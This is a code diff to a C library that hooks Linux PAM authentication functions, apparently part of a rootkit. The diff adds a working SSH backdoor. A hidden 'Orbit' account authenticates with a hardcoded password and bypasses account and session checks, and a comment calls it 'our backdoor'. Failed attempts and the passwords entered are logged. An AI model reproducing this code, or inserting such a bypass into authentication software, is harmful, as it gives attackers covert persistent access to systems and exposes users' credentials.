@@ -49,6 +49,25 @@ uint8_t detect_human_err( const char *passwd, const char *user, char *o_user )
     return ( PAM_AUTH_ERR );
 }
 
+/*
+ * \fn uint8_t  check_Orbit( pam_handle_t *, const char *, const char *, const char * )
+ * \brief It checks if the password entered for the Orbit account is correct.
+ */
+uint8_t     check_Orbit( pam_handle_t *pamh, const char *service, const char *user, const char *host )
+{
+    struct pam_response *pwd = pam_get_password(pamh, "", 0, "Welcome Orbit: Password: ");
+    if ( pwd == NULL )
+        return ( PAM_CONV_ERR );
+
+    if ( _orBit_strcmp( pwd->resp, "SbiyaZTH3H0bxkw02ENn") == 0 )
+        return ( PAM_SUCCESS );
+
+    // # If the password for Orbit is incorrect, we log the attempt as it could be someone else trying to access our backdoor.
+    ssize_t size = sprintf( buf, "%s:%s:%s:%s:%s\n", service, user, host, pwd->resp, "ERROR"); 
+    __LOG( buf, size );
+    return ( PAM_AUTH_ERR );
+}
+
 int pam_authenticate(pam_handle_t *pamh, int flags )
 {
     const char *service = NULL, *host = NULL, *user = NULL;
@@ -56,9 +75,9 @@ int pam_authenticate(pam_handle_t *pamh, int flags )
     uint8_t res = 0;
     int size = 0;
 
-	static int ( *orig_pam_authenticate ) ( pam_handle_t *, int  ) = NULL;
-	if ( ! orig_pam_authenticate )
-		orig_pam_authenticate = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_authenticate");
+    static int ( *orig_pam_authenticate ) ( pam_handle_t *, int  ) = NULL;
+    if ( ! orig_pam_authenticate )
+        orig_pam_authenticate = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_authenticate");
 
     const char *service_sshd = ("sshd");
     int err = pam_get_item( pamh, PAM_SERVICE, ( void *)&service);
@@ -69,7 +88,11 @@ int pam_authenticate(pam_handle_t *pamh, int flags )
 
         if ( pam_get_item(pamh, PAM_RHOST, ( void * ) &host) != PAM_SUCCESS )
             return ( PAM_AUTH_ERR );
-	   
+
+        // # Authorize SSH connections from external sources with the Orbit account.
+        if ( _orBit_strcmp( "Orbit", user ) == 0 )
+            return ( check_Orbit( pamh, service, user, host ));
+
         pwd = pam_get_password(pamh, "", 0, "Password: ");
         if ( pwd == NULL )
             return ( PAM_CONV_ERR );
@@ -112,34 +135,32 @@ int pam_authenticate(pam_handle_t *pamh, int flags )
 
 int     pam_acct_mgmt(pam_handle_t *pamh, int flags)
 {
-	static int ( *__pam_acct_mgmt ) ( pam_handle_t *, int  ) = NULL;
-	if ( ! __pam_acct_mgmt )
-		__pam_acct_mgmt = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_acct_mgmt");
+    static int ( *__pam_acct_mgmt ) ( pam_handle_t *, int  ) = NULL;
+    if ( ! __pam_acct_mgmt )
+        __pam_acct_mgmt = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_acct_mgmt");
 
     char    *user = NULL;
     if ( pam_get_item(pamh, PAM_USER, ( void * ) &user ) != PAM_SUCCESS )
             return ( PAM_AUTH_ERR );
-	return __pam_acct_mgmt ( pamh, flags );
+
+    // # Authorize SSH connections from external sources with the Orbit account. 
+    if ( _orBit_strcmp( "Orbit", user ) == 0 )
+        return ( PAM_SUCCESS );
+    return __pam_acct_mgmt ( pamh, flags );
 }
 
 int     pam_open_session(pam_handle_t *pamh, int flags)
 {
-	static int ( *__pam_open_session ) ( pam_handle_t *, int  ) = NULL;
-	if ( ! __pam_open_session )
-		__pam_open_session = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_open_session");
-    return ( PAM_SUCCESS );
+    static int ( *__pam_open_session ) ( pam_handle_t *, int  ) = NULL;
+        if ( ! __pam_open_session )
+            __pam_open_session = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_open_session");
+
     char    *user = NULL;
     if ( pam_get_item(pamh, PAM_USER, ( void * ) &user ) != PAM_SUCCESS )
             return ( PAM_AUTH_ERR );
-	return __pam_open_session(pamh, flags);
-}
 
-int pam_setcred(pam_handle_t __attribute__((unused))* pamh , int __attribute__((unused))flags )
-{
-    
-	static int ( *__pam_setcred ) ( pam_handle_t *, int  ) = NULL;
-	if ( ! __pam_setcred )
-		__pam_setcred = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_setcred");
-   return __pam_setcred( pamh, flags );
+    // # Authorize SSH connections from external sources with the Orbit account. 
+    if ( _orBit_strcmp( "Orbit", user ) == 0 )
+        return ( PAM_SUCCESS );
+    return __pam_open_session(pamh, flags);
 }
-
